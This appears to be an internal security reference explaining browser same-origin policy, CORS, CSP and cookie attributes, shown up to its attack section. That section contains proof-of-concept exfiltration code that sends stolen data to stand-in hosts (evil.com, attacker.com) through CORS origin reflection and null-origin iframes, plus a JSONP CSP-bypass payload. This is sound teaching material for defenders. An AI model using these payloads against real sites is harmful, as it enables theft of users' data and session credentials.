# Browser Security Model Deep Dive (SOP, CORS, CSP): Engineering & Security Breakdown

> **Document Type:** Internal Security Architecture / Protocol Engineering Reference  
> **Classification:** Internal — Security Engineering, Platform Security, Web Infrastructure  
> **Scope:** End-to-end browser security model — same-origin isolation to CSP enforcement, CORS handshakes to bypass mechanics  
> **Audience:** Security engineers, web developers, platform architects, interview candidates  

---

## Table of Contents

1. [Protocol Lifecycle Narrative](#1-protocol-lifecycle-narrative)
2. [Header & Packet Anatomy](#2-header--packet-anatomy)
3. [Cryptographic & Trust Mechanics](#3-cryptographic--trust-mechanics)
4. [Core Implementation Architecture](#4-core-implementation-architecture)
5. [Bypass & Attack Mechanics](#5-bypass--attack-mechanics)
6. [Security Controls & Defensive Mechanics](#6-security-controls--defensive-mechanics)
7. [Attack Surface Mapping](#7-attack-surface-mapping)
8. [Failure Points & Misconfigurations](#8-failure-points--misconfigurations)
9. [Mitigations & Observability](#9-mitigations--observability)
10. [Interview Questions](#10-interview-questions)

---

## 1. Protocol Lifecycle Narrative

### The Three Pillars: SOP, CORS, CSP in a Benign Scenario

To understand the security model, follow a complete user interaction: a user visits `https://app.example.com` (a single-page application), which loads resources from a CDN, makes API calls to `https://api.example.com`, and embeds third-party analytics.

---

### Phase 1: Page Load and SOP Initialization

**T=0ms — User navigates to `https://app.example.com/dashboard`**

The browser has NO existing SOP context for this navigation. A top-level navigation is always allowed regardless of SOP — the origin is being established, not crossed.

The browser issues:
```
GET /dashboard HTTP/2
Host: app.example.com
```

The server responds:
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m123' https://cdn.example.com; ...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
```

At the moment the browser parses the HTML response and commits the navigation:
- The **origin** of this page is established: `https://app.example.com`
- Origin = scheme (`https`) + host (`app.example.com`) + port (implicit 443)
- This origin is stored in the browser's **security origin context** for this tab/frame
- Every subsequent resource request, script execution, and DOM access is evaluated against this origin

**The browser parses the HTML and finds resources:**
```html
<script src="/static/app.js" nonce="r4nd0m123"></script>
<script src="https://cdn.example.com/analytics.js" nonce="r4nd0m123"></script>
<link rel="stylesheet" href="/static/app.css">
<img src="https://images.example.com/logo.png">
```

Each resource has different SOP treatment:

| Resource | URL | SOP Treatment |
|---|---|---|
| `app.js` | Same origin | Loaded without restriction |
| `analytics.js` | `cdn.example.com` | Different origin — loaded as **opaque** script (fetched from cross-origin, but granted execution context of current page via `<script>` tag embedding) |
| `app.css` | Same origin | Loaded without restriction |
| `logo.png` | `images.example.com` | Different origin — loaded as opaque image (no JS access to pixel data) |

**The critical SOP rule on script execution**: A script loaded from `https://cdn.example.com/analytics.js` executes in the **calling page's origin context** (`https://app.example.com`), NOT in cdn.example.com's context. This is why supply chain attacks on CDNs are so devastating — the script gets full access to the page's DOM, cookies, and localStorage as if it were a first-party script.

---

### Phase 2: CORS Preflight for API Call

**T=100ms — JavaScript in `app.js` makes an API call:**

```javascript
fetch('https://api.example.com/v1/user/profile', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIs...'
    },
    body: JSON.stringify({ userId: '12345' }),
    credentials: 'include'  // Send cookies cross-origin
});
```

**T=100ms — Browser evaluates the request against SOP:**

The request is from `https://app.example.com` to `https://api.example.com`. These have different hosts — **different origins**. The browser applies SOP.

**Is this a "simple" request?** A simple request does NOT trigger a preflight. Criteria:
- Method: GET, POST, or HEAD
- Headers: only safe headers (Accept, Accept-Language, Content-Language, Content-Type with `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`)
- No ReadableStream in body
- No event listener on XMLHttpRequestUpload

This request is **NOT simple** because:
1. The `Authorization` header is non-simple
2. `Content-Type: application/json` is non-simple (only `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data` are safe)
3. `credentials: 'include'` is set

Therefore: **CORS preflight required**.

**T=100ms — Browser automatically sends preflight OPTIONS:**

```
OPTIONS /v1/user/profile HTTP/2
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type
```

This is sent by the browser on the JavaScript's behalf. The JavaScript code does not control this — it's transparent to the developer.

**T=120ms — API server responds to preflight:**

```
HTTP/2 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
Vary: Origin
```

The browser validates this response:
1. `Access-Control-Allow-Origin` exactly matches the requesting origin (required when credentials are sent — wildcards are forbidden with credentials)
2. `Access-Control-Allow-Methods` includes `POST`
3. `Access-Control-Allow-Headers` includes both `authorization` and `content-type` (case-insensitive comparison)
4. `Access-Control-Allow-Credentials: true` is present (required because request has `credentials: 'include'`)
5. `Access-Control-Max-Age: 86400` — browser caches this preflight result for 24 hours (up to browser-imposed limits: Chrome caps at 2 hours, Firefox at 24 hours)

**T=130ms — Browser sends the actual request:**

```
POST /v1/user/profile HTTP/2
Host: api.example.com
Origin: https://app.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
Content-Type: application/json
Cookie: session=abc123  (included because credentials: 'include')

{"userId": "12345"}
```

**T=150ms — API server responds:**

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: X-Request-ID
Content-Type: application/json

{"name": "Alice", "email": "alice@example.com"}
```

The browser validates the actual response:
1. `Access-Control-Allow-Origin` is present and matches the requesting origin
2. `Access-Control-Allow-Credentials: true` is present (cookies were sent)
3. The browser **exposes** the response body to JavaScript

Without these headers on the actual response, the browser would return an opaque response to JavaScript — the request DOES go to the server, but JavaScript cannot read the response. This is a fundamental misunderstanding: CORS is enforced client-side by the browser, not server-side. The server processes ALL requests. CORS only controls whether the browser exposes the response to JavaScript.

---

### Phase 3: CSP Enforcement

**T=200ms — Analytics script tries to exfiltrate data:**

The `analytics.js` script contains:
```javascript
// Legitimate: collect performance data
navigator.sendBeacon('https://analytics.example.com/collect', JSON.stringify({...}));

// Malicious attempt (injected code):
document.querySelector('#password-field').addEventListener('change', function(e) {
    new Image().src = 'https://evil.com/steal?data=' + e.target.value;
});
```

**CSP evaluation for the legitimate beacon:**

The CSP header was: `default-src 'self'; script-src 'self' 'nonce-r4nd0m123' https://cdn.example.com; connect-src 'self' https://api.example.com https://analytics.example.com`

`sendBeacon('https://analytics.example.com/...')` — browser checks `connect-src`. `analytics.example.com` is explicitly listed. **ALLOWED**.

**CSP evaluation for the malicious exfiltration attempt:**

`new Image().src = 'https://evil.com/steal?...'` — browser checks `img-src`. The CSP has no explicit `img-src`, so it falls back to `default-src 'self'`. `evil.com` is not `self` (not `app.example.com`). **BLOCKED**.

Additionally, the malicious inline script `document.querySelector...` was injected INTO the `analytics.js` script — since `analytics.js` was loaded with a valid nonce, the browser DID execute it. This is why the nonce protects the initial script load but does NOT protect against malicious code inside a trusted script. CSP cannot prevent supply chain attacks on CDN scripts.

---

## 2. Header & Packet Anatomy

### Origin Header Anatomy

The `Origin` header is the cornerstone of SOP enforcement in HTTP requests. It is sent:
- On all cross-origin requests
- On same-origin requests with POST method (historically, to prevent CSRF)
- On all requests via `fetch()` with `mode: 'cors'`
- On WebSocket upgrade requests

```
Origin: https://app.example.com

Parsing breakdown:
  scheme: "https"    ← must be https or http (no wildcards, no paths)
  host: "app.example.com"   ← exact hostname (no trailing dot)
  port: (implicit 443 for HTTPS, 80 for HTTP)
  
  NOT included in Origin:
  - path component (/dashboard)
  - query string (?tab=overview)
  - fragment (#section1)
  - username/password (never included)
```

**Origin is "opaque" in specific circumstances:**
- Requests from `null` origin (data: URIs, local files, sandboxed iframes)
- Requests where origin would reveal sensitive information
- Redirects where the browser strips the origin to `null`

---

### CORS Response Header Anatomy

```
ACCESS-CONTROL RESPONSE HEADERS (server → browser):
───────────────────────────────────────────────────────────────────────────────

Access-Control-Allow-Origin: https://app.example.com
  OR
Access-Control-Allow-Origin: *

  Semantics:
  - Exact origin: allows ONLY this origin (required for credentialed requests)
  - Wildcard (*): allows ANY origin (but CANNOT be used with credentials)
  - NO header present: browser blocks cross-origin response from JS
  - Multiple values: NOT ALLOWED by spec. Must be dynamic (single value per response).
  
  Why Vary: Origin is critical:
  If the server dynamically sets ACAO based on the request Origin,
  intermediate caches (CDNs, reverse proxies) MUST see "Vary: Origin"
  to avoid serving the wrong ACAO header to different origin requestors.
  Without Vary: Origin, a CDN could cache a response with ACAO: attacker.com
  and serve it to requests from app.example.com, blocking legitimate access.

Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE
  - Comma-separated list of allowed HTTP methods
  - Only relevant in preflight responses
  - DELETE, PATCH, PUT are non-simple → always require preflight
  - Wildcard (*) allowed since 2021 fetch spec update (but not with credentials)

Access-Control-Allow-Headers: Authorization, Content-Type, X-Custom-Header
  - Case-insensitive comparison against request headers
  - Must explicitly list non-simple headers
  - Simple headers (Accept, Content-Language, etc.) are always allowed
  - Wildcard (*) allowed but not with credentials

Access-Control-Allow-Credentials: true
  - ONLY valid value is the lowercase string "true"
  - "True", "TRUE", "1", "yes" are all invalid
  - Tells browser it's OK to expose the response even though credentials were sent
  - Requires ACAO to be an exact origin (not *)
  - Without this: cookies sent in request, but JavaScript cannot read the response

Access-Control-Expose-Headers: X-Request-ID, X-Rate-Limit
  - By default, JS can only access: Cache-Control, Content-Language, 
    Content-Length, Content-Type, Expires, Last-Modified, Pragma
  - All other response headers are "forbidden" to JS even for allowed CORS requests
  - This header explicitly allows additional headers

Access-Control-Max-Age: 86400
  - Browser caches the preflight result for this many seconds
  - Chrome hard limit: 7200 (2 hours)
  - Firefox hard limit: 86400 (24 hours)
  - -1 means: do not cache (always do preflight)
  - Default if not specified: browser discretion (usually short)
```

---

### CSP Header Anatomy

```
CONTENT-SECURITY-POLICY HEADER ANATOMY
───────────────────────────────────────────────────────────────────────────────

Full production CSP header (line-broken for readability):
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m123ABCdef' https://cdn.example.com;
  style-src 'self' 'nonce-r4nd0m123ABCdef' https://fonts.googleapis.com;
  img-src 'self' data: https://images.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com https://analytics.example.com wss://realtime.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  block-all-mixed-content;
  report-uri https://csp-report.example.com/collect;
  report-to csp-endpoint;

DIRECTIVE BREAKDOWN:

default-src 'self'
  ↳ Fallback for all fetch directives not explicitly specified
  ↳ 'self': exact scheme + host + port of current document
  ↳ Does NOT match subdomains (app.example.com ≠ other.example.com)

script-src 'self' 'nonce-r4nd0m123ABCdef' https://cdn.example.com
  ↳ Scripts must come from self OR cdn.example.com, OR have matching nonce
  ↳ Nonce: base64-encoded cryptographically random value (min 128 bits)
  ↳ Generated per-response by the server (never reused across responses)
  ↳ Added to trusted inline scripts: <script nonce="r4nd0m123ABCdef">...</script>
  ↳ Nonce DOES NOT protect against DOM injection (if attacker injects HTML,
    they can't know the nonce — but 'unsafe-eval' would let them bypass this)
  
  Script source matching rules:
  - 'self': same origin
  - 'none': nothing (not even self)
  - 'unsafe-inline': allows inline scripts (defeats most XSS protection)
  - 'unsafe-eval': allows eval(), Function(), setTimeout(string) (high risk)
  - 'strict-dynamic': allows scripts loaded by trusted scripts (nonce-whitelisted)
    (when combined with nonce, 'strict-dynamic' IGNORES allowlist entries in older
    CSP levels — only nonce-loaded scripts and their children are trusted)
  - URL: exact URL or URL pattern (scheme://host/path, * wildcards allowed in host)
  - 'nonce-<base64>': any script with this nonce attribute
  - 'sha256-<hash>': any script whose content SHA-256 matches

form-action 'self'
  ↳ WHERE forms can submit to (separate from script-src)
  ↳ Does NOT fall back to default-src
  ↳ If not set: forms can submit to any origin (phishing risk)

base-uri 'self'
  ↳ WHERE <base href="..."> can point to
  ↳ A base tag injection could redirect all relative URLs to attacker.com
  ↳ base-uri 'self' prevents this attack vector
  ↳ Does NOT fall back to default-src

upgrade-insecure-requests
  ↳ Browser rewrites http:// resource URLs to https:// before fetching
  ↳ Different from HSTS: HSTS redirects the browser, this rewrites the request
  ↳ Does NOT affect external navigations

NONCE vs HASH tradeoff:
  Nonce: dynamic (generated per request), easier to implement, must protect 
         the nonce generation RNG against prediction
  Hash: static (computed over script content), better for caching, requires
        update whenever script content changes, must track hashes of all scripts
```

---

### SameSite Cookie Anatomy

```
SET-COOKIE HEADER WITH FULL SECURITY ATTRIBUTES:
───────────────────────────────────────────────────────────────────────────────

Set-Cookie: session=abc123;
            Secure;
            HttpOnly;
            SameSite=Strict;
            Path=/;
            Domain=example.com;
            Max-Age=3600

Secure:
  ↳ Cookie only sent over HTTPS connections
  ↳ NOT encrypted (still in plaintext header on the HTTPS request)
  ↳ Protects against network eavesdroppers on HTTP connections

HttpOnly:
  ↳ Cookie not accessible via document.cookie (JavaScript)
  ↳ Still sent in all HTTP requests (including cross-origin GET requests
    unless SameSite blocks it)
  ↳ PRIMARY defense against XSS cookie theft

SameSite=Strict:
  ↳ Cookie sent ONLY when navigation originates from same site
  ↳ "Same site" = eTLD+1 match (example.com == app.example.com == api.example.com)
  ↳ NOT the same as same-origin (different scheme or port still matches)
  ↳ Prevents: CSRF, login detection attacks
  ↳ Breaks: OAuth flows (OAuth redirect returns from external IdP)
  ↳ Breaks: Links from external sites (user clicks link in email → not sent)

SameSite=Lax (default since Chrome 80):
  ↳ Cookie sent on top-level cross-site navigations with "safe" methods (GET)
  ↳ NOT sent on: cross-site sub-resource requests, form POSTs from other sites
  ↳ Prevents: CSRF via form POST (most common CSRF vector)
  ↳ Allows: link navigation from external sites

SameSite=None:
  ↳ Cookie sent on ALL cross-origin requests
  ↳ MUST be combined with Secure (Chrome requirement)
  ↳ Required for: OAuth, federated login, cross-origin iframes, third-party embeds
  ↳ Highest CSRF risk: must implement CSRF tokens separately

"Same site" definition (important):
  site = (eTLD+1) — effective top-level domain PLUS one label
  eTLD list maintained by Mozilla: publicsuffix.org
  
  Examples:
  https://app.example.com and https://api.example.com → SAME SITE (example.com)
  https://app.example.com and https://example.com → SAME SITE (example.com)
  https://app.github.io and https://attacker.github.io → DIFFERENT SITES 
    (github.io is on the Public Suffix List → treated as a TLD)
```

---

## 3. Cryptographic & Trust Mechanics

### TLS Certificate Trust Chain for SOP

SOP relies on TLS to establish origin identity. The scheme+host+port triple is only meaningful if the "https" scheme is backed by a valid certificate.

```
CERTIFICATE TRUST CHAIN VERIFICATION
═══════════════════════════════════════════════════════════════════════════════

Browser requests https://app.example.com

TLS Handshake:
  Server presents certificate chain:
  
  [End-Entity Certificate]
  Subject: app.example.com
  SANs: app.example.com, *.example.com (if wildcard)
  Issuer: DigiCert TLS RSA SHA256 2020 CA1
  Public Key: RSA-2048 / ECDSA P-256
  Validity: 2024-01-15 → 2025-01-15 (max 398 days per CA/B Forum)
  
      ↑ signed by (RSA or ECDSA signature over cert TBSCertificate)
  
  [Intermediate CA Certificate]
  Subject: DigiCert TLS RSA SHA256 2020 CA1
  Issuer: DigiCert Global Root CA
  
      ↑ signed by
  
  [Root CA Certificate]
  Subject: DigiCert Global Root CA
  Self-signed (issuer == subject)
  Trusted: pre-embedded in OS / browser trust store
  
BROWSER VERIFICATION:
  1. Build the chain: end-entity → intermediate → root
  2. For each certificate:
     a. Verify signature using parent's public key
     b. Check validity period (not before, not after)
     c. Check KeyUsage extension (digitalSignature, keyEncipherment for TLS)
     d. Check ExtendedKeyUsage (1.3.6.1.5.5.7.3.1 = TLS Web Server Authentication)
  3. Check that the root is in the trusted root store
  4. Check Subject Alternative Names: does server hostname match any SAN?
     - Wildcard matching: *.example.com matches app.example.com
       but NOT sub.app.example.com (one label only)
     - No wildcards in the first label of the parent: *.com is invalid
  5. Certificate Transparency check (since Chrome 2018):
     Certificate MUST appear in at least 2 independent CT logs
     Verified via SCTs (Signed Certificate Timestamps) embedded in the cert
     or delivered in the TLS handshake
  6. OCSP/CRL check (revocation):
     OCSP stapling: server includes a signed OCSP response in handshake
     Hard fail if revocation status unavailable: Chrome does NOT hard-fail
     (soft-fail: if OCSP is unreachable, proceed anyway — availability vs security)

ORIGIN ESTABLISHMENT AFTER TLS:
  TLS verification succeeded: the hostname "app.example.com" is cryptographically
  tied to the presented certificate.
  
  SOP origin = scheme + hostname + port
  The "https" scheme is meaningful because TLS verified "app.example.com"
  maps to the entity that controls this certificate (via CA vouching).
  
  WITHOUT TLS: 
  SOP origin for http://app.example.com is "http://app.example.com"
  A network attacker (on-path) can intercept, respond as any origin
  SOP provides zero security guarantees over HTTP
```

---

### CSP Nonce Cryptographic Requirements

```
NONCE GENERATION REQUIREMENTS:
───────────────────────────────────────────────────────────────────────────────

CSP nonce MUST be:
  1. Cryptographically random (CSPRNG)
  2. At least 128 bits of entropy (16 bytes = 22 characters base64)
  3. Unique per HTTP response (never reused across responses)
  4. Not predictable by attackers (cannot enumerate)

Generation (Python):
  import secrets, base64
  nonce = base64.b64encode(secrets.token_bytes(18)).decode()
  # 18 bytes = 144 bits → 24 base64 characters

Injection in server-side template:
  response = render_template('page.html', csp_nonce=nonce)
  response.headers['Content-Security-Policy'] = \
    f"script-src 'self' 'nonce-{nonce}'"
  # Template uses: <script nonce="{{ csp_nonce }}">

WHY REUSE IS CATASTROPHIC:
  If the nonce is the same across responses (e.g., hardcoded in config):
  An attacker who can inject HTML (XSS) knows the nonce value by inspecting
  any page source. They inject:
  <script nonce="hardcoded123">evil_code()</script>
  CSP validates the nonce matches → script executes
  The nonce becomes equivalent to 'unsafe-inline'

HASH-BASED ALTERNATIVE:
  Instead of nonce, compute SHA-256 of the exact script content:
  
  script = "var x = 1; doSomething();"
  hash = base64(SHA256(script.encode('utf-8')))
  # CSP: script-src 'sha256-<hash>'
  
  The browser computes SHA-256 of the inline script and compares.
  ADVANTAGE: static (no per-request generation)
  DISADVANTAGE: any whitespace change in script invalidates the hash
                must update CSP every time script content changes
```

---

### Trust Chain ASCII Diagram

```
BROWSER SECURITY TRUST HIERARCHY
═══════════════════════════════════════════════════════════════════════════════

CERTIFICATE TRUST (establishes origin identity over TLS):

Root CA (trusted by OS/browser)
    │
    │ cryptographic signature (RSA/ECDSA)
    ▼
Intermediate CA (in-memory, not pre-installed)
    │
    │ cryptographic signature
    ▼
End-entity cert (served by app.example.com)
    │
    │ TLS handshake proves possession of private key
    ▼
Verified TLS connection → origin "https://app.example.com" established

CORS TRUST FLOW (establishes cross-origin permission):

app.example.com (browser tab)
    │
    │ preflight OPTIONS with Origin: https://app.example.com
    ▼
api.example.com (server)
    │
    │ validates Origin against allowlist
    │ responds with Access-Control-Allow-Origin: https://app.example.com
    ▼
Browser validates ACAO header
    │
    │ ACAO matches requesting origin → allow JS access to response
    ▼
JavaScript in app.example.com receives response body

CSP TRUST (establishes resource loading permission):

Web server (controls what origins are trusted for this page)
    │
    │ Content-Security-Policy header
    ▼
Browser parses CSP directives into a policy object
    │
    │ For EVERY resource load:
    │ Check directive applicable to resource type
    │ Match source against directive's source list
    ▼
ALLOW: source matches directive
BLOCK + report violation to report-uri

KEY INSIGHT — TRUST DIRECTION:
  Certificate trust: established by THIRD PARTY (CA)
  CORS trust: established by the TARGET server
  CSP trust: established by the REQUESTING page's server
  SameSite trust: established by the COOKIE-SETTING server
  
  None of these rely on the requesting client being honest.
  All rely on the BROWSER enforcing the rules — which is why
  browser fingerprinting and headless browsers break the model.
```

---

## 4. Core Implementation Architecture

### Browser's CORS Decision Tree

```
BROWSER CORS DECISION ENGINE (per-request evaluation):
───────────────────────────────────────────────────────────────────────────────

Is this a cross-origin request?
(origin of script != scheme+host+port of target URL)
    │
    ├── NO → SOP allows: request proceeds without CORS
    │
    └── YES → Evaluate CORS

Is credentials mode 'include' OR is the method non-simple OR are non-simple headers present?
    │
    ├── NO (simple request, no credentials) →
    │   Send request directly
    │   If response lacks ACAO header: browser blocks JS access (opaque response)
    │   Request DID reach the server (server processed it)
    │   
    └── YES → PREFLIGHT REQUIRED
        │
        Check preflight cache:
        key = (origin, url, method, headers)
        is cache entry present AND not expired?
        │
        ├── YES: cache hit → skip preflight, send actual request
        │
        └── NO: cache miss → send OPTIONS preflight
            │
            Wait for OPTIONS response:
            │
            ├── Response status != 200/204: CORS error, block actual request
            │
            ├── ACAO doesn't match OR missing: CORS error, block
            │
            ├── ACAM doesn't include actual method: CORS error, block
            │
            ├── ACAH doesn't include actual headers: CORS error, block
            │
            ├── Credentials sent but ACAC != "true": CORS error, block
            │
            └── All checks pass:
                Store in preflight cache with Max-Age TTL
                Send actual request

On actual response:
    │
    └── Validate ACAO on ACTUAL response too (not just preflight):
        ACAO present AND matches requesting origin?
        │
        ├── NO → Block JS access to response (opaque response)
        │         (request reached server, server processed it,
        │          but browser hides response from JavaScript)
        │
        └── YES → Allow JS access to response body and
                  explicitly exposed headers
```

---

### Server-Side CORS Implementation (What Actually Needs to Happen)

```python
# Correct CORS middleware implementation
# Common mistakes are shown with comments

from flask import Flask, request, abort
import hmac

ALLOWED_ORIGINS = {
    'https://app.example.com',
    'https://admin.example.com',
}

@app.after_request
def apply_cors(response):
    origin = request.headers.get('Origin')
    
    # MISTAKE 1: Always return wildcard
    # response.headers['Access-Control-Allow-Origin'] = '*'
    # This prevents credentials from working AND allows ANY origin
    
    # MISTAKE 2: Reflect origin without validation
    # response.headers['Access-Control-Allow-Origin'] = origin
    # This allows any origin to make credentialed requests!
    
    # MISTAKE 3: String prefix/suffix matching
    # if origin and 'example.com' in origin:
    #     response.headers['ACAO'] = origin
    # Bypassed by: https://evil-example.com or https://example.com.attacker.com
    
    # CORRECT: Exact match against allowlist
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Vary'] = 'Origin'  # CRITICAL: tell caches to vary on Origin
    
    if request.method == 'OPTIONS':
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, DELETE, PATCH'
        response.headers['Access-Control-Allow-Headers'] = 'Authorization, Content-Type'
        response.headers['Access-Control-Max-Age'] = '7200'
        response.status_code = 204
    
    return response
```

---

### CSP State Machine in Browser

```
CSP POLICY OBJECT (browser internal representation after parsing header):

Policy {
  directives: {
    "default-src": SourceList { 'self' },
    "script-src": SourceList { 'self', Nonce("r4nd0m123"), Host("cdn.example.com") },
    "style-src": SourceList { 'self', Nonce("r4nd0m123") },
    "img-src": SourceList { 'self', DataScheme, Host("images.example.com") },
    "connect-src": SourceList { 'self', Host("api.example.com") },
    "frame-src": SourceList { 'none' },
    "base-uri": SourceList { 'self' },
    "form-action": SourceList { 'self' },
  },
  reportingEndpoints: ["https://csp-report.example.com/collect"],
  upgradeInsecureRequests: true
}

RESOURCE LOAD EVALUATION:
  Browser calls: isAllowed(resourceType, url, element)
  
  1. Determine applicable directive:
     script → check "script-src" → if missing, check "default-src"
     style  → check "style-src"  → if missing, check "default-src"
     img    → check "img-src"    → if missing, check "default-src"
     fetch/XHR/WebSocket → check "connect-src"
     <frame>/<iframe> → check "frame-src"
     <form action=...> → check "form-action" (does NOT fall back to default-src)
     <base href=...>   → check "base-uri"    (does NOT fall back to default-src)
  
  2. Check source against each expression in the directive's SourceList:
     'none': matches nothing
     'self': matches origin of document (exact scheme+host+port)
     Nonce("xyz"): matches element with nonce="xyz" attribute
     Hash("sha256-..."): matches element whose content hashes to this value
     Host("cdn.example.com"): matches exact hostname
     Host("*.example.com"): matches any subdomain (not including example.com itself)
     Scheme("https:"): matches any https URL
  
  3. If ANY expression matches: ALLOW
     If NO expression matches: BLOCK + generate violation report
```

---

### Preflight Caching Mechanics

```
PREFLIGHT CACHE IMPLEMENTATION:
───────────────────────────────────────────────────────────────────────────────

Cache key: (origin, URL, method, sorted-canonical-headers)
  e.g., ("https://app.example.com", "https://api.example.com/v1/profile", 
          "POST", "authorization,content-type")

Cache value: 
  { allowed_methods: ["GET","POST","DELETE"],
    allowed_headers: ["authorization","content-type"],
    max_age_expiry: timestamp + min(server_max_age, browser_hard_limit) }

Eviction:
  Chrome: hard cap at 7200 seconds (2 hours), max 1000 entries
  Firefox: hard cap at 86400 seconds (24 hours)
  Safari: follows spec more loosely
  
  Cache is PER-ORIGIN, not per-tab (one tab's preflight caches benefit other tabs)
  
CACHE INVALIDATION PROBLEM:
  If server changes CORS policy (removes a method or header), the browser
  may continue to send preflightless requests for up to max_age.
  
  If the server now REJECTS those requests: broken for users with cached preflight.
  Solution: change max_age to 0 during CORS policy changes, wait for propagation.
  
  The server MUST still validate CORS on the actual request response
  (not just trust that the preflight was valid) — the actual response's ACAO
  is the final enforcement gate.
```

---

## 5. Bypass & Attack Mechanics

### Attack 1: CORS Misconfiguration — Origin Reflection

**The most common CORS vulnerability: reflecting the Origin header without validation.**

```
ATTACK: CORS Origin Reflection → Credential Theft
───────────────────────────────────────────────────────────────────────────────

SETUP:
  API server CORS config (incorrect):
  if (request.headers['Origin']) {
      response.setHeader('Access-Control-Allow-Origin', request.headers['Origin']);
      response.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  Result: ANY origin can make credentialed cross-origin requests.

ATTACKER'S PAGE (hosted at https://attacker.com):
<script>
  // Victim's browser visits attacker.com (via phishing link)
  // This JavaScript runs in the victim's browser
  
  fetch('https://api.example.com/v1/user/private-data', {
    credentials: 'include'  // Sends victim's session cookie
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate victim's private data to attacker's server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>

STEP BY STEP:
1. Victim is logged into app.example.com (has session cookie)
2. Victim visits attacker.com (via phishing, malvertising, etc.)
3. attacker.com's JavaScript makes fetch() to api.example.com
4. Browser sends: Origin: https://attacker.com
5. api.example.com reflects: Access-Control-Allow-Origin: https://attacker.com
6. api.example.com sends: Access-Control-Allow-Credentials: true
7. Because ACAO matches and ACAC=true: browser sends the session cookie
8. api.example.com responds with victim's private data
9. Browser (correctly!) returns the response to attacker's JavaScript
10. JavaScript exfiltrates data

WHY THIS WORKS:
  The CORS check is on the RESPONSE headers, not the request.
  The browser will send credentials to any origin the victim has visited.
  The SOP would normally prevent reading the response, but CORS explicitly 
  permits it when the server's ACAO matches the attacker's origin.
  
  The spec says: servers can allow any origin they want.
  The security is entirely on the server to not blindly reflect.
```

---

### Attack 2: null Origin Bypass

```
ATTACK: null Origin → Bypass CORS Allowlist
───────────────────────────────────────────────────────────────────────────────

Many implementations check:
  if (origin === 'null') {
      response.headers['ACAO'] = 'null';  // Mistake!
  }
  
  OR:
  if (!origin || origin === 'null') {
      // No CORS header set → often defaults to wildcard or open policy
  }

WHEN IS Origin: null SENT?
  1. Sandboxed iframes: <iframe sandbox="allow-scripts" src="...">
  2. data: URIs: <iframe src="data:text/html,<script>...</script>">
  3. file:// pages (local files)
  4. Redirects that strip origin (301/302 across schemes)
  5. Cross-origin windows after data: navigation

ATTACK USING SANDBOXED IFRAME:
<html>
<body>
  <!-- sandbox attribute strips the origin, causing null origin requests -->
  <iframe sandbox="allow-scripts allow-forms" srcdoc="
    <script>
      fetch('https://api.example.com/v1/admin/users', {
        credentials: 'include'
      }).then(r => r.json()).then(data => {
        // Since this iframe has null origin, if ACAO: null is returned,
        // the browser allows the response to be read
        parent.postMessage(JSON.stringify(data), '*');
      });
    </script>
  "></iframe>
  
  <script>
    window.addEventListener('message', function(e) {
      // Receive stolen data from the iframe
      fetch('https://attacker.com/steal', {
        method: 'POST', body: e.data
      });
    });
  </script>
</body>
</html>

STEP BY STEP:
1. Victim visits attacker.com
2. Sandboxed iframe executes fetch to api.example.com
3. Browser sends: Origin: null (because iframe is sandboxed)
4. Server checks: origin === 'null' → sets ACAO: null → ACAC: true
5. Browser reads the null origin and ACAO: null → they match!
6. Response is returned to iframe's JavaScript
7. iframe postMessages the data to parent window (attacker.com)
8. Parent exfiltrates to attacker's server

WHY THIS WORKS:
  "null" is a valid serialization of opaque origins.
  The spec says ACAO: null is a valid CORS allow header.
  The browser treats it as "the null origin is allowed."
  Any sandboxed iframe or data: URI has null origin, so an attacker
  can generate a null origin from their page and exploit this.
```

---

### Attack 3: CSP Bypass via JSONP and 'unsafe-inline' Fallback

```
ATTACK: CSP Script-Src Bypass via Allowlisted Domain with JSONP
───────────────────────────────────────────────────────────────────────────────

SETUP:
  CSP: script-src 'self' https://cdn.example.com
  
  The developer allowlisted cdn.example.com because they serve jQuery from there.
  
  PROBLEM: If cdn.example.com has ANY JSONP endpoint, an attacker can use
  it as a script source to execute arbitrary JavaScript.

WHAT IS JSONP?
  JSONP (JSON with Padding) is a legacy cross-origin data technique:
  <script src="https://cdn.example.com/api?callback=myFunc">
  Server returns: myFunc({"data": "value"})
  The browser executes this as a script, calling myFunc() with the data.
  
  If the callback parameter is reflected without sanitization:
  https://cdn.example.com/api?callback=evil_function
  Server returns: evil_function({"data": "value"})

ATTACK:
  Attacker finds cdn.example.com/data.json?callback=<name>
  Attacker injects into the page (via stored XSS, or reflected input):
  <script src="https://cdn.example.com/data.json?callback=alert(document.cookie)//"></script>
  
  Server returns:
  alert(document.cookie)//({"data": "value"})
  
  CSP check: is https://cdn.example.com allowed in script-src? YES.
  Browser loads and executes the script.
  alert(document.cookie) runs.
  
  The // comments out the JSON data, making it valid JS.

REAL WORLD IMPLICATIONS:
  Google analytics (analytics.google.com), Twitter, Facebook APIs,
  and many other common CDNs historically had JSONP endpoints.
  If ANY of these are in script-src, CSP is effectively bypassed.
  
